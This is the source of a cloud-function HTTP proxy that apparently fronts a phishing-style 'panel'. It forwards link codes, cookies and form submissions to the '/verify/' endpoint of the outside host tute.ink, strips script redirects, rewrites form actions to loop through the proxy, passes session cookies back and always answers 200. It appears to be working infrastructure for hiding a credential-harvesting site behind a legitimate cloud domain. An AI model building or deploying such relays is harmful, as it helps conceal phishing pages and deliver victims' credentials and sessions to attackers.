const crypto = require('crypto');
const PANEL = 'tute.ink';

module.exports = async function (context, req) {
    let path = req.headers['x-ms-original-url'] || req.url || '/';
    try { if (path.startsWith('http')) { const u = new URL(path); path = u.pathname + u.search; } } catch(e){}
    
    // 1. Clean up the path
    path = path.replace(/^\/api\/proxy/, '');
    if (!path.startsWith('/')) path = '/' + path;

    // 2. Extract the code
    const parts = path.split('/').filter(Boolean);
    let code = '';
    let originalRandomString = '';

    if (parts.length === 2 && parts[0] !== 'api' && parts[1].length > 4) {
        // e.g., /bc29429fe8ed/M7OCTS
        originalRandomString = parts[0];
        code = parts[1];
    } else if (parts.length === 1 && parts[0].length > 4) {
        // e.g., /api/proxy/M7OCTS
        code = parts[0];
    }

    if (!code) {
        context.res = { status: 400, body: "Invalid link. Missing code." };
        return;
    }

    // 3. Always target the panel's /verify/ endpoint
    path = `/verify/${code}`;
    if (req.query && Object.keys(req.query).length > 0) {
        path += '?' + new URLSearchParams(req.query).toString();
    }

    context.log(`Forwarding ${req.method} to: ${path}`);

    const forwardHeaders = {
        'Host': PANEL,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': req.headers['accept'] || '*/*',
        'X-Ablegod-Worker': '1'
    };
    if (req.headers['cookie'])       forwardHeaders['Cookie']       = req.headers['cookie'];
    if (req.headers['content-type']) forwardHeaders['Content-Type'] = req.headers['content-type'];

    let body;
    if (!['GET','HEAD'].includes(req.method) && req.body) {
        body = typeof req.body === 'string' ? req.body : JSON.stringify(req.body);
        if (!forwardHeaders['Content-Type']) forwardHeaders['Content-Type'] = 'application/json';
    }

    try {
        let currentUrl = `https://${PANEL}${path}`;
        let r;

        // 4. Follow server-side redirects
        for (let hop = 0; hop < 5; hop++) {
            r = await fetch(currentUrl, {
                method: req.method,
                headers: forwardHeaders,
                body: body,
                redirect: 'manual'
            });

            const loc = r.headers.get('location');
            if (r.status >= 300 && r.status < 400 && loc) {
                let finalUrl = new URL(loc, currentUrl).toString();
                finalUrl = finalUrl.replace(/^https:\/\/(www\.)?tute\.ink/, `https://${PANEL}`);
                currentUrl = finalUrl;
                continue;
            }
            break;
        }

        let responseBody = await r.text();
        const contentType  = r.headers.get('content-type') || 'text/html';

        // 5. Clean up the HTML for the browser
        if (contentType.includes('text/html')) {
            // Strip JS redirects
            responseBody = responseBody.replace(/<script\b[^>]*>([\s\S]*?)<\/script>/gi, function(match, scriptContent) {
                if (scriptContent.includes('window.location') || scriptContent.includes('location.href')) {
                    return ''; 
                }
                return match;
            });
            // Fix any form actions the panel might have output
            responseBody = responseBody.replace(/action=["']\/verify\/([^"']+)["']/gi, 'action="/api/proxy/$1"');
        }

        const respHeaders = {
            'Content-Type': contentType,
            'Access-Control-Allow-Origin': '*',
            'Cache-Control': 'no-store, no-cache, must-revalidate'
        };
        
        const setCookie = r.headers.get('set-cookie');
        if (setCookie) respHeaders['Set-Cookie'] = setCookie;

        // Always return 200 to prevent browser redirects
        context.res = { status: 200, headers: respHeaders, body: responseBody };
    } catch (e) {
        context.log('Error:', e.message);
        context.res = { status: 500, body: 'Proxy Error: ' + e.message };
    }
};
